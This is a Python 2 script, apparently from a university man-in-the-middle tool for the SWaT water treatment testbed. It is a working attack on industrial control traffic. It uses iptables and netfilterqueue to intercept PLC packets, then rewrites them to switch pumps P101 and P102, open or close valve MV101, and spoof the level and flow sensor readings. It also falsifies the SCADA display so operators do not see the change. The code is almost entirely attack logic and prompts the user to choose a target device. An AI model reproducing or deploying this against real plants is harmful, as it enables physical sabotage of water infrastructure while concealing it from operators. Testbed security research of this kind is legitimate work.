#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2019  Beebi Siti Salimah Binte Liyakkathali, liyakkathali@sutd.edu.sg
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER

# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

#Last modified on: 02 May 2019

# Script part of A6_L0 Mitm tool: https://github.com/ibmilo/A6-L0-MITM
# Some attributes to 	https://github.com/ifyouaretea/A6-MITM
#			https://github.com/scy-phy/swat



import datetime
import ctypes
from time import sleep
from time import time as ts
import signal
import os
import sys
from netfilterqueue import NetfilterQueue
from scapy import all as scapy_all
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from plc1 import SWAT_P1_RIO_DO, SWAT_P1_RIO_DI, SWAT_P1_RIO_AI

from scaling_all import P1Flow, P1Level, P2Flow, P2Cond, P2Ph, P2Orp, P3Level, P3Flow, P3DPress, \
                    P4Level, P4Hrdss, P4Flow, P4Orp, \
                    P5FeedPh, P5FeedOrp, P5FeedCond, P5PremCond, P5FeedFlow, P5PermFlow,\
                    P5ConcFlow, P5RecFlow, P5HPumpPress, P5PermPress, P5ConcPress,\
                    P6BackFlow, current_to_signal, signal_to_current



global toggle_flag
global current_spoofed

device_type = []
device_tag = []
value = []
scada = []


class attack_P1_level0:

    toggle_flag = False
 

    def __init__(self):
        self.toggle_flag = False


    def start(self):
        self.nfqueue = NetfilterQueue()
        os.system('sudo iptables -t mangle -A PREROUTING -s 192.168.0.12,192.168.0.10 -p udp --dport 2222 -j NFQUEUE --queue-num 2')
        self.nfqueue.bind(2, self.attack_P1_level0,10)
        self.nfqueue.run()
        print('***********************inject start******************************')


    def stop(self):
        os.system('cat /proc/net/netfilter/nfnetlink_queue')
        os.system('sudo iptables -t mangle -F')
        self.nfqueue.unbind()
        print('*** STOPPING IPTABLES ***')



    def attack_P1_level0(self,packet):
        global device_tag
        global value 
        global scada

        length = len(device_tag)
        ind = 0
        pkt = IP(packet.get_payload())


        while ind < length:

          dev = device_tag[ind]
          val = value[ind]
          sca = scada[ind]



          if SWAT_P1_RIO_DO in pkt:
              
            if dev  == "P101":
              pkt[SWAT_P1_RIO_DO].pump1_start = val
            if dev  == "P102":
              pkt[SWAT_P1_RIO_DO].pump2_start = val
            if dev  == "MV101":

              if val == 0:

                  pkt[SWAT_P1_RIO_DO].valve_close = 1
                  pkt[SWAT_P1_RIO_DO].valve_open = 0

              elif val == 1:

                  pkt[SWAT_P1_RIO_DO].valve_close = 0
                  pkt[SWAT_P1_RIO_DO].valve_open = 1

              else:
                print "Enter 0 to close valve or 1 to open valve"


          if SWAT_P1_RIO_DI in pkt:

            if dev == "P101":
              pkt[SWAT_P1_RIO_DI].pump1_run = sca

            elif dev == "P102":

              pkt[SWAT_P1_RIO_DI].pump2_run = sca

            else :# dev == "MV101":

              if sca == 0:

                  pkt[SWAT_P1_RIO_DI].valve_close = 1
                  pkt[SWAT_P1_RIO_DI].valve_open = 0

              elif sca == 1:

                  pkt[SWAT_P1_RIO_DI].valve_close = 0
                  pkt[SWAT_P1_RIO_DI].valve_open = 1

              else:
                print "Enter 0 to close valve or 1 to open valve"

          
          if SWAT_P1_RIO_AI in pkt:

            #alter water level
            if dev == "LIT101":
              self.true_measurement_P1_level =  current_to_signal(pkt[SWAT_P1_RIO_AI].level, P1Level)  #scaling
            
              if(self.toggle_flag == False):
                spoofed_measurement = self.true_measurement_P1_level
                self.toggle_flag = True
            
              if(self.toggle_flag):
                spoofed_measurement = val
                current_spoofed = signal_to_current(spoofed_measurement, P1Level) 
                pkt[SWAT_P1_RIO_AI].level =  current_spoofed

                print('LIT101 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P1_level,spoofed_measurement))
        
                   

            #alter flow rate 
            if dev == "FIT101":
              self.true_measurement_P1_flow =  current_to_signal(pkt[SWAT_P1_RIO_AI].flow, P1Flow)  #scaling
            
              if(self.toggle_flag == False):
                spoofed_measurement = self.true_measurement_P1_flow
                self.toggle_flag = True
            
              if(self.toggle_flag):
                spoofed_measurement = val
                current_spoofed = signal_to_current(spoofed_measurement, P1Flow) 
                pkt[SWAT_P1_RIO_AI].flow =  current_spoofed

                print('FIT101 valve changed from  %1.4f to %1.4f ' % (self.true_measurement_P1_flow,spoofed_measurement))
        
          ind = ind +1         
          
          del pkt[UDP].chksum  # Need to recompute checksum
          pkt.show()
          packet.set_payload(str(pkt))

        packet.accept()


def start():

     attacker = attack_P1_level0();
     def signal_term_handler(signal, frame):
         print('*** STOPPING')
         attacker.stop()

     signal.signal(signal.SIGTERM, signal_term_handler)
     try:
         print('attacker is loaded')
         attacker.start()
         signal.pause()  # wait for a signal
     except KeyboardInterrupt:
         print('*** STOPPING')
         attacker.stop()


if __name__=='__main__':
  
    num_of_attacks = int(raw_input('Enter number of actuators attacks : '))


    for i in range (num_of_attacks) :
        print ("For Point %i >>>") % (i + 1)

        dev_type = raw_input('Enter device type to attack (e.g PUMP, AIT, VALVE) : ')
      
        if dev_type == "PUMP" or dev_type == "VALVE" or dev_type == "LED":
           dev_tag = raw_input('Enter tag  to attack (e.g P101, MV101, FIT101) : ')
           val =  int (raw_input('Enter value - ON (1) or OFF (0) : '))

        elif dev_type == "FIT" or dev_type == "LIT":
            dev_tag = raw_input('Enter tag  to attack (e.g P101, MV101, FIT101) : ')
            val =  int (raw_input('Enter value to spoofed value : '))

        else:
            print "Device type not found"
            sys.exit()

        sca =  int (raw_input('Set SCADA display to - ON (1) or OFF (0) : '))

        if dev_tag =="P101" or dev_tag == "P102" or dev_tag == "LIT101" or dev_tag == "FIT101" or dev_tag == "MV101": 
         
       
          device_type.append(dev_type)
          device_tag.append(dev_tag)
          value.append(val)
          scada.append(sca)
          
        else:
          print "Device tag not found"
          sys.exit()

    sys.exit(start())


